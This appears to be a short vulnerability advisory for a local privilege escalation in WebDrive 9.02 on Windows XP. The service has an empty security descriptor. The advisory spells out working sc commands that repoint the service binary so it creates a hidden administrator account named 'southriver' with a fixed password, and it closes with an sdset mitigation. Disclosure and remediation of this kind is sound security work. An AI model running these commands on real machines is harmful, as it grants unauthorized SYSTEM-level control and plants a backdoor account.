Tested against:
South River Technologies WebDrive 9.02 build 2232
on Microsoft Windows XP SP3

The "WebDrive Service" is installed with an empty security descriptor. A malicious user can
stop the service, then invoke the "sc config" command to replace the binary path with a value
of choice, then restart the service to run the command with SYSTEM privileges ex., run theese
commands as a limited user:

sc stop WebDriveService
sc config WebDriveService binPath= "cmd /c net user southriver kills /add && net localgroup Administrators southriver /add"
sc start WebDriveService
runas /noprofile /user:%COMPUTERNAME%\southriver cmd

now login as administrator with password "kills"

mitigation:

the security descriptor of the service is like this:

C:\>sc sdshow WebDriveService

D:

change the security descriptor like the following:

c:\sc sdset WebDriveService D:(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPLOCRRC;;;PU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)
